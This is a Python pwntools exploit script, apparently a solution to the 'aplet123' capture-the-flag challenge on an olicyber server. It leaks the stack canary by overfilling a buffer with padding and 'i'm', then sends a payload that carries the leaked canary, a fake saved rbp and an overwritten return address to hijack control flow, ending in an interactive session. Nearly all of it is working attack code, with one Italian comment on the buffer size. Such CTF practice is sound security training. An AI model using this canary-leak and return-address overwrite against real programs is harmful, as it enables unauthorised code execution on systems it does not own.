from pwn import *

context.arch = 'amd64'

if args.REMOTE:
     conn = remote('vault.challs.olicyber.it', 10006)
else:
     conn = gdb.debug('/home/mattia/Downloads/aplet123', '''
        b *main
        c             
     ''')


conn.recvuntil(b'hello')
conn.sendline(b'A' * (69) + b"i'm")#dato che strstr inizia a leggere appena trova il carattere i'm bisogna riempire il buffer con 69 'A' + 3 byte "i'm" per un totale di 72 byte, grandezza del buffer
conn.recvuntil(b'hi ')
canary = u64(b'\0' + conn.recv(7))
print(f'{hex(canary)}') 

print(f'canary: {canary}')


addr = 0x4011E6 

payload = b'A' * 72
payload += p64(canary)
payload += b'B' * 8  #  rbp
payload += p64(addr)

conn.sendlineafter(b'aplet123\n', payload)
conn.sendline(b'bye')



conn.interactive()